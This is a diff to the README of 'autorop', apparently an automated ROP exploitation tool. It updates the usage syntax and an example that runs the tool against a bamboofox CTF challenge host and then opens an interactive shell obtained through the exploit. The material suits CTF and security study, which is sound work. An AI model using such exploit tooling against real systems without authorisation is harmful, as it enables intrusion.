@@ -17,12 +17,12 @@ Command line
 
 .. code-block:: text
 
-    $ python -m autorop.autorop
-    Usage: autorop BINARY [HOST IP]
+    $ autorop
+    Usage: autorop BINARY [HOST PORT]
 
 .. code-block:: text
 
-    $ python -m autorop.autorop tests/bamboofox/ret2libc bamboofox.cs.nctu.edu.tw 11002
+    $ autorop tests/bamboofox/ret2libc bamboofox.cs.nctu.edu.tw 11002
     [+] Opening connection to bamboofox.cs.nctu.edu.tw on port 11002: Done
     [*] '/data/Projects/autorop/tests/bamboofox/ret2libc'
         Arch:     i386-32-little
@@ -87,7 +87,7 @@ See how the below example neatly manages to "downgrade" the problem from somethi
     state = pipeline(s, set_overwriter, turnkey.classic(leak=leak.printf))
 
     # switch to interactive shell which we got via the exploit
-    result.target.interactive()
+    s.target.interactive()
 
 .. |docs| image:: https://readthedocs.org/projects/autorop/badge/
     :target: https://autorop.readthedocs.io
